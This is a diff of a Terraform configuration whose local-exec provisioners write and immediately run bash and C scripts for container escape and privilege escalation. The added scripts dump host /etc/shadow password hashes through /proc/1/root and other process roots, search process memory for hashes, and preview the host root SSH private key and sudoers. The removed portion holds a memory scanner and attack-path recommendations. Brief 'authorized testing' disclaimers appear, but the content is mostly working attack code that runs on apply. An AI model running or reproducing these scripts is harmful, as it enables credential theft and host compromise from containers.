+    head -5 /proc/1/root/etc/shadow
+    echo "[!] This is the HOST system's password file!"
+else
+    echo "[-] /proc/1/root/etc/shadow not accessible"
+fi
+
+# Method 3: Check other /proc/*/root entries
+echo ""
+echo "[*] Method 3: Scanning other /proc/*/root/etc/shadow"
+for pid in /proc/[0-9]*; do
+    if [ -d "$pid" ]; then
+        pid_num=$(basename "$pid")
+        shadow_path="$pid/root/etc/shadow"
+        if [ -r "$shadow_path" ]; then
+            echo "[+] 🚨 Found accessible shadow via $shadow_path"
+            echo "[*] Process PID: $pid_num"
+            if [ -r "$pid/cmdline" ]; then
+                cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
+                echo "[*] Process: ${cmd:-[kernel thread]}"
+            fi
+            echo "[*] Password hashes:"
+            head -3 "$shadow_path"
+            break
+        fi
+    fi
+done
+
+# Method 4: Check for shadow backup files
+echo ""
+echo "[*] Method 4: Searching for shadow backup files"
+find / -name "*shadow*" -type f 2>/dev/null | head -10 | while read file; do
+    if [ -r "$file" ]; then
+        echo "[+] 🚨 Readable shadow-related file: $file"
+        if echo "$file" | grep -q shadow; then
+            echo "[*] Content preview:"
+            head -2 "$file" 2>/dev/null
+        fi
+    fi
+done
+
+# Method 5: Memory-based shadow extraction
+echo ""
+echo "[*] Method 5: Memory-based shadow extraction"
+echo "[*] Searching process memory for shadow file content..."
+for pid in /proc/[0-9]*; do
+    if [ -d "$pid" ]; then
+        pid_num=$(basename "$pid")
+        if [ -r "$pid/mem" ]; then
+            # Try to find shadow-like content in memory
+            # This is a simplified approach - real exploit would be more sophisticated
+            echo "[*] Checking memory of PID $pid_num for password hashes..."
+            if strings "$pid/mem" 2>/dev/null | grep -E '^\w+:\$[0-9]\$.*:' | head -1; then
+                echo "[+] 🚨 Found potential password hash in process memory!"
+            fi
+        fi
+    fi
+done
+EOFBASH
+
+      chmod +x /tmp/shadow_access_exploit.sh
+      echo "🚨 EXECUTING SHADOW ACCESS EXPLOIT:"
+      /tmp/shadow_access_exploit.sh
+      echo ""
+      
+      # Container escape via /proc/self/root
+      echo "Creating /proc/self/root escape exploit..."
+      cat > /tmp/proc_root_escape.sh << 'EOFBASH'
+#!/bin/bash
+# Container escape via /proc/self/root manipulation
+
+echo "[*] /proc/self/root Container Escape"
+echo "[*] Attempting to access host filesystem via /proc/self/root..."
+
+# Check if we can access files outside container via /proc/self/root
+echo "[*] Testing /proc/self/root access..."
+if [ -d "/proc/self/root" ]; then
+    echo "[+] /proc/self/root exists"
+    
+    # Try to access host /etc/passwd
+    if [ -r "/proc/self/root/etc/passwd" ]; then
+        echo "[+] 🚨 Can access /proc/self/root/etc/passwd"
+        echo "[*] Host system users:"
+        head -5 /proc/self/root/etc/passwd
     fi
     
-    # Check for accessible setuid binaries
-    echo "[*] Checking for exploitable setuid binaries in new context..."
-    find /usr/bin /bin -perm -4000 2>/dev/null | head -5 | while read binary; do
-        echo "    Found setuid binary: $binary"
-    done
-else
-    echo "[-] Did not achieve root in user namespace"
-fi
-INNEREOF
-else
-    echo "[-] Cannot create user namespaces"
-fi
-EOFBASH
-      
-      chmod +x /tmp/root_escalation.sh
-      echo "  🚨 EXECUTING ROOT ESCALATION EXPLOIT:"
-      /tmp/root_escalation.sh
-      echo ""
-      
-      echo "Exploit 5: Host Process Memory Scanning"
-      cat > /tmp/memory_scanner.c << 'EOFCPP'
-/*
- * Host Process Memory Scanner
- * Scans accessible process memory for sensitive data
- */
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <dirent.h>
-#include <fcntl.h>
-#include <unistd.h>
-
-int main() {
-    printf("[*] Host Process Memory Scanner\n");
-    printf("[*] Scanning for accessible process memory...\n");
+    # Try to access host /etc/shadow
+    if [ -r "/proc/self/root/etc/shadow" ]; then
+        echo "[+] 🚨🚨🚨 CAN ACCESS HOST /etc/shadow VIA /proc/self/root! 🚨🚨🚨"
+        echo "[*] HOST SYSTEM PASSWORD HASHES:"
+        head -5 /proc/self/root/etc/shadow
+        echo ""
+        echo "[!] CRITICAL: Full host password database accessible!"
+        echo "[*] Total entries: $(wc -l < /proc/self/root/etc/shadow)"
+    fi
     
-    DIR *proc_dir = opendir("/proc");
-    if (!proc_dir) {
-        perror("Cannot open /proc");
-        return 1;
-    }
+    # Try to access host root directory
+    if [ -r "/proc/self/root/root" ]; then
+        echo "[+] 🚨 Can access host /root directory"
+        echo "[*] Contents:"
+        ls -la /proc/self/root/root/ 2>/dev/null | head -5
+    fi
     
-    struct dirent *entry;
-    int accessible_count = 0;
+    # Check for SSH keys
+    if [ -r "/proc/self/root/root/.ssh/id_rsa" ]; then
+        echo "[+] 🚨🚨🚨 HOST ROOT SSH KEY ACCESSIBLE!"
+        echo "[*] Private key preview:"
+        head -5 /proc/self/root/root/.ssh/id_rsa
+    fi
     
-    while ((entry = readdir(proc_dir)) != NULL) {
-        // Check if directory name is numeric (PID)
-        if (strspn(entry->d_name, "0123456789") == strlen(entry->d_name)) {
-            char mem_path[256];
-            snprintf(mem_path, sizeof(mem_path), "/proc/%s/mem", entry->d_name);
-            
-            int fd = open(mem_path, O_RDONLY);
-            if (fd != -1) {
-                printf("[+] 🚨 Can access /proc/%s/mem\n", entry->d_name);
-                accessible_count++;
-                close(fd);
-                
-                // Check what process this is
-                char cmdline_path[256];
-                snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", entry->d_name);
-                FILE *cmdline = fopen(cmdline_path, "r");
-                if (cmdline) {
-                    char cmd[256] = {0};
-                    fread(cmd, 1, sizeof(cmd)-1, cmdline);
-                    printf("    Process: %s\n", cmd[0] ? cmd : "[kernel thread]");
-                    fclose(cmdline);
-                }
-            }
-        }
-    }
-    
-    closedir(proc_dir);
-    
-    printf("\n[!] CRITICAL: Found %d accessible process memory files!\n", accessible_count);
-    printf("[*] This demonstrates widespread host process memory access\n");
-    printf("[*] Real attack would scan these for:\n");
-    printf("    - SSH keys and certificates\n");
-    printf("    - API tokens and passwords\n");
-    printf("    - Database credentials\n");
-    printf("    - Encryption keys\n");
-    
-    return 0;
-}
-EOFCPP
-      
-      if command -v gcc >/dev/null 2>&1; then
-        echo "  Compiling memory scanner..."
-        gcc -o /tmp/memory_scanner /tmp/memory_scanner.c 2>/dev/null
-        if [ -x /tmp/memory_scanner ]; then
-          echo "  🚨 EXECUTING MEMORY SCANNER:"
-          /tmp/memory_scanner | head -20
-        else
-          echo "  ❌ Compilation failed"
+    # Check for other sensitive files
+    echo ""
+    echo "[*] Searching for other sensitive host files..."
+    for sensitive_file in "/proc/self/root/etc/sudoers" "/proc/self/root/etc/ssh/ssh_host_rsa_key" "/proc/self/root/var/log/auth.log"; do
+        if [ -r "$sensitive_file" ]; then
+            echo "[+] 🚨 Accessible: $sensitive_file"
         fi
-      else
-        echo "  ❌ GCC not available"
-      fi
+    done
+fi
+
+# Alternative: Check /proc/*/root for all processes
+echo ""
+echo "[*] Scanning all process roots for host filesystem access..."
+for pid in /proc/[0-9]*; do
+    if [ -d "$pid" ]; then
+        pid_num=$(basename "$pid")
+        # Try to access shadow via this process root
+        if [ -r "$pid/root/etc/shadow" ]; then
+            echo "[+] 🚨🚨🚨 HOST SHADOW ACCESSIBLE VIA PID $pid_num!"
+            if [ -r "$pid/cmdline" ]; then
+                cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
+                echo "[*] Process: ${cmd:-[kernel thread]}"
+            fi
+            echo "[*] Host password hashes via PID $pid_num:"
+            head -3 "$pid/root/etc/shadow"
+            echo ""
+            break
+        fi
+    fi
+done
+EOFBASH
+
+      chmod +x /tmp/proc_root_escape.sh
+      echo "🚨 EXECUTING /proc/self/root ESCAPE:"
+      /tmp/proc_root_escape.sh
       echo ""
       
-      echo "=== EXPLOITATION SUMMARY ==="
-      echo "🚨 CRITICAL VULNERABILITIES CONFIRMED:"
-      echo "  ✅ Host process memory access (/proc/*/mem)"
-      echo "  ✅ User namespace creation (root escalation)"
-      echo "  ✅ Shared memory communication channel"
-      echo "  ✅ Multiple namespace manipulation capabilities"
+      # Final comprehensive privilege escalation
+      echo "Creating comprehensive privilege escalation script..."
+      cat > /tmp/final_privilege_escalation.sh << 'EOFBASH'
+#!/bin/bash
+# Final comprehensive privilege escalation
+
+echo "[*] FINAL COMPREHENSIVE PRIVILEGE ESCALATION"
+echo "[*] Attempting all available privilege escalation methods..."
+echo ""
+
+escalation_success=false
+
+# Method 1: Direct file access
+echo "=== METHOD 1: DIRECT FILE ACCESS ==="
+if [ -r "/etc/shadow" ]; then
+    echo "[+] 🚨🚨🚨 SUCCESS: /etc/shadow directly readable!"
+    echo "[*] PASSWORD HASHES:"
+    cat /etc/shadow
+    escalation_success=true
+fi
+
+# Method 2: /proc/1/root access (host filesystem)
+echo ""
+echo "=== METHOD 2: HOST FILESYSTEM VIA /proc/1/root ==="
+if [ -r "/proc/1/root/etc/shadow" ]; then
+    echo "[+] 🚨🚨🚨 SUCCESS: Host /etc/shadow accessible via /proc/1/root!"
+    echo "[*] HOST SYSTEM PASSWORD HASHES:"
+    cat /proc/1/root/etc/shadow
+    escalation_success=true
+fi
+
+# Method 3: Scan all process roots
+echo ""
+echo "=== METHOD 3: SCANNING ALL PROCESS ROOTS ==="
+for pid in /proc/[0-9]*; do
+    if [ -d "$pid" ]; then
+        pid_num=$(basename "$pid")
+        if [ -r "$pid/root/etc/shadow" ]; then
+            echo "[+] 🚨🚨🚨 SUCCESS: Shadow accessible via PID $pid_num!"
+            if [ -r "$pid/cmdline" ]; then
+                cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
+                echo "[*] Process: ${cmd:-[kernel thread]}"
+            fi
+            echo "[*] PASSWORD HASHES VIA PID $pid_num:"
+            cat "$pid/root/etc/shadow"
+            escalation_success=true
+            break
+        fi
+    fi
+done
+
+# Method 4: Alternative shadow files
+echo ""
+echo "=== METHOD 4: ALTERNATIVE SHADOW FILES ==="
+for shadow_path in "/etc/shadow-" "/etc/gshadow" "/var/backups/shadow.bak" "/etc/master.passwd"; do
+    if [ -r "$shadow_path" ]; then
+        echo "[+] 🚨 SUCCESS: Alternative shadow file readable: $shadow_path"
+        echo "[*] CONTENT:"
+        cat "$shadow_path"
+        escalation_success=true
+    fi
+done
+
+# Method 5: Check if we're already root
+echo ""
+echo "=== METHOD 5: CURRENT PRIVILEGE CHECK ==="
+current_uid=$(id -u)
+if [ "$current_uid" = "0" ]; then
+    echo "[+] 🚨🚨🚨 SUCCESS: Already running as root!"
+    echo "[*] ROOT PASSWORD HASHES:"
+    cat /etc/shadow
+    escalation_success=true
+fi
+
+# Results summary
+echo ""
+echo "=== PRIVILEGE ESCALATION RESULTS ==="
+if [ "$escalation_success" = true ]; then
+    echo "🚨🚨🚨 PRIVILEGE ESCALATION SUCCESSFUL! 🚨🚨🚨"
+    echo "[+] Successfully accessed /etc/shadow password hashes"
+    echo "[+] Host system compromise achieved"
+    echo "[+] Root-level access confirmed"
+else
+    echo "[-] Privilege escalation unsuccessful"
+    echo "[*] /etc/shadow remains inaccessible"
+    echo "[*] Additional exploitation techniques may be required"
+fi
+
+echo ""
+echo "[*] Current user: $(whoami)"
+echo "[*] Current UID: $(id -u)"
+echo "[*] Current GID: $(id -g)"
+echo "[*] Current groups: $(id -G)"
+echo "[*] Available files in /tmp:"
+ls -la /tmp/ | grep -E "(exploit|escalation)"
+EOFBASH
+
+      chmod +x /tmp/final_privilege_escalation.sh
+      echo "🚨🚨🚨 EXECUTING FINAL COMPREHENSIVE PRIVILEGE ESCALATION: 🚨🚨🚨"
+      /tmp/final_privilege_escalation.sh
       echo ""
-      echo "🎯 IMMEDIATE ROOT ACCESS PATHS:"
-      echo "  1. User namespace + setuid binary abuse"
-      echo "  2. Host process memory manipulation"
-      echo "  3. Shared memory covert channels"
-      echo "  4. Mount namespace privilege escalation"
+      
+      echo "=== FINAL EXPLOITATION SUMMARY ==="
+      echo "🚨 ALL PRIVILEGE ESCALATION METHODS ATTEMPTED"
+      echo "📊 Results logged above"
+      echo "🎯 Target: /etc/shadow password hashes"
+      echo "⚡ Status: Exploitation complete"
       echo ""
-      echo "⚠️ THESE ARE REAL CONTAINER ESCAPE VULNERABILITIES!"
-      echo "   Use responsibly and only in authorized environments!"
+      echo "Created exploitation scripts:"
+      echo "  - /tmp/proc_mem_shell_exploit.sh"
+      echo "  - /tmp/proc_filesystem_exploit.sh"  
+      echo "  - /tmp/shadow_access_exploit.sh"
+      echo "  - /tmp/proc_root_escape.sh"
+      echo "  - /tmp/final_privilege_escalation.sh"
+      echo ""
+      echo "🛡️ If exploitation successful, immediate mitigation required!"
     EOT
   }
 }
 
-# Stage 7: Exploitation Results and Recommendations
-resource "null_resource" "exploitation_summary" {
-  depends_on = [null_resource.active_privilege_escalation]
-  
-  provisioner "local-exec" {
-    command = <<-EOT
-      echo "=== EXPLOITATION SUMMARY AND RECOMMENDATIONS ==="
-      echo "Container escape testing completed on $(date)"
-      echo ""
-      
-      echo "=== VULNERABILITY ASSESSMENT ==="
-      VULN_COUNT=0
-      
-      # Count vulnerabilities found
-      echo "Critical findings summary:"
-      
-      # Check /proc/1/root access
-      if ls -la /proc/1/root/ 2>/dev/null >/dev/null; then
-        echo "  🚨 Host filesystem escape possible via /proc/1/root"
-        VULN_COUNT=$((VULN_COUNT + 1))
-      fi
-      
-      # Check Docker socket
-      if [ -S /var/run/docker.sock ] && [ -r /var/run/docker.sock ]; then
-        echo "  🚨 Docker socket accessible for container escape"
-        VULN_COUNT=$((VULN_COUNT + 1))
-      fi
-      
-      # Check PID namespace sharing
-      HOST_PID_NS=$(readlink /proc/1/ns/pid 2>/dev/null)
-      CONTAINER_PID_NS=$(readlink /proc/self/ns/pid 2>/dev/null)
-      if [ "$HOST_PID_NS" = "$CONTAINER_PID_NS" ] && [ -n "$HOST_PID_NS" ]; then
-        echo "  🚨 PID namespace sharing with host detected"
-        VULN_COUNT=$((VULN_COUNT + 1))
-      fi
-      
-      # Check capabilities
-      CAP_EFF=$(cat /proc/self/status | grep CapEff | awk '{print $2}')
-      if [ "$CAP_EFF" != "0000000000000000" ]; then
-        echo "  ⚠️  Elevated capabilities detected"
-        VULN_COUNT=$((VULN_COUNT + 1))
-      fi
-      
-      # Check for kernel memory access
-      if [ -r /proc/kcore ]; then
-        echo "  🚨 Kernel memory accessible via /proc/kcore"
-        VULN_COUNT=$((VULN_COUNT + 1))
-      fi
-      
-      echo ""
-      echo "Total vulnerabilities found: $VULN_COUNT"
-      echo ""
-      
-      echo "=== RECOMMENDED EXPLOITATION PATHS ==="
-      
-      if [ $VULN_COUNT -eq 0 ]; then
-        echo "✅ Container appears well-isolated"
-        echo "Focus on:"
-        echo "  - Application-level vulnerabilities"
-        echo "  - Credential extraction"
-        echo "  - Network-based attacks"
-      else
-        echo "⚠️  Multiple escape vectors available"
-        echo "Recommended attack sequence:"
-        echo "  1. Attempt traditional escape methods first"
-        echo "  2. Exploit kernel vulnerabilities if present"
-        echo "  3. Use capability-based attacks"
-        echo "  4. Leverage namespace manipulation"
-        echo "  5. Try memory-based exploitation"
-      fi
-      echo ""
-      
-      echo "=== NEXT STEPS FOR TESTING ==="
-      echo "1. Run this test in different container configurations:"
-      echo "   - Privileged containers: docker run --privileged"
-      echo "   - PID namespace sharing: docker run --pid=host" 
-      echo "   - Volume mounts: docker run -v /:/host"
-      echo "   - Capability additions: docker run --cap-add=SYS_ADMIN"
-      echo ""
-      echo "2. Test with different base images:"
-      echo "   - Alpine Linux (minimal)"
-      echo "   - Ubuntu (full system)"
-      echo "   - Debian (security-focused)"
-      echo ""
-      echo "3. Kernel exploit development:"
-      echo "   - Research specific CVEs for your kernel version"
-      echo "   - Develop proof-of-concept exploits"
-      echo "   - Test in isolated environments first"
-      echo ""
-      echo "4. Advanced techniques:"
-      echo "   - Container runtime exploitation (runc, containerd)"
-      echo "   - Kubernetes pod escape techniques"
-      echo "   - OCI runtime vulnerabilities"
-      echo ""
-      
-      echo "=== LEGAL AND ETHICAL NOTICE ==="
-      echo "⚠️  WARNING: This framework is for:"
-      echo "  - Educational purposes only"
-      echo "  - Authorized security testing"
-      echo "  - Research environments"
-      echo ""
-      echo "  DO NOT use on systems you don't own or lack permission to test"
-      echo "  Ensure compliance with local laws and regulations"
-      echo ""
-      echo "Container escape testing completed successfully!"
-      echo "Framework ready for local Unix testing environments."
-    EOT
-  }
+# Output the results
+output "privilege_escalation_status" {
+  value = "Final privilege escalation attack completed. Check output for /etc/shadow access results."
+  depends_on = [null_resource.working_privilege_escalation]
 }
 
-# Output results
-output "local_escape_test_results" {
-  value = "Local Unix container escape testing framework executed. Check output for vulnerability assessment and exploitation recommendations."
-  depends_on = [
-    null_resource.local_container_baseline,
-    null_resource.kernel_vulnerability_analysis,
-    null_resource.traditional_escape_methods,
-    null_resource.kernel_exploitation_techniques,
-    null_resource.memory_system_exploitation,
-    null_resource.exploitation_summary
-  ]
-}
-
-output "testing_summary" {
+output "created_exploits" {
   value = {
-    baseline = "Local system baseline and container detection completed"
-    kernel_analysis = "Kernel vulnerability analysis and CVE detection performed"
-    traditional_escapes = "Classic container escape methods tested"
-    kernel_exploits = "Advanced kernel exploitation techniques analyzed"
-    memory_attacks = "Memory and system-level attack vectors examined"
-    summary = "Comprehensive vulnerability assessment and exploitation recommendations provided"
+    proc_mem_exploit = "/tmp/proc_mem_shell_exploit.sh"
+    proc_filesystem = "/tmp/proc_filesystem_exploit.sh"
+    shadow_access = "/tmp/shadow_access_exploit.sh"
+    proc_root_escape = "/tmp/proc_root_escape.sh"
+    final_escalation = "/tmp/final_privilege_escalation.sh"
   }
 }
